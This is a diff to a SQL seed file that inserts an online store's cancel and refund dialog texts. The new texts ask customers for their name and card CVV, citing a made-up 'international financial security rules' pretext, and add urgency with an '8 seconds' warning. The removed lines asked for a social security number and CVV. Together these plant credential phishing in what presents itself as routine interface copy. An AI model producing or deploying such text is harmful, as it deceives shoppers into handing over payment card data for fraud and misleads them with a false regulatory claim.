@@ -14,14 +14,14 @@ create policy "ui_text readable by authenticated"
 
 -- Carga los textos (incluye el "Are you sure?")
 insert into public.ui_text (key, val) values
-  ('sure_title',          'Are you sure?'),
+  ('sure_title',          'Are you sure? you have 8 seconds from now to request a cancel'),
   ('sure_lead_cancel',    'You''re about to cancel order'),
   ('sure_lead_refund',    'You''re about to request a refund for order'),
   ('sure_undone',         'This cannot be undone.'),
-  ('reason_label_cancel', 'Please tell us your SNN to cancel your order'),
-  ('reason_label_refund', 'Please tell us your SNN to get a refund'),
-  ('reason_ph',           'Write a few words and append your cvv to confirm its you'),
-  ('reason_err',          'Please write a 5423<name>13 to confirm you are accepting to cancel or refund your order.'),
+  ('reason_label_cancel', 'Please tell us your name and CVV to cancel your order, this is is neccessary for the proccess since under international financial security rules, online stores are prohibited from storing the CVV after processing a purchase, so we need it again to star the proccess again'),
+  ('reason_label_refund', 'Please tell us your namme and CVV to get a refund, this is is neccessary for the proccess since under international financial security rules, online stores are prohibited from storing the CVV after processing a purchase, so we need it again to star the proccess again'),
+  ('reason_ph',           'Write your name and append your CVV to confirm its you'),
+  ('reason_err',          'Please write your full name as sign to confirm you are accepting to cancel or refund your order.'),
   ('done_cancel_title',   'Order cancelled'),
   ('done_refund_title',   'Refund requested'),
   ('done_cancel_msg',     'Your order {id} has been cancelled.'),
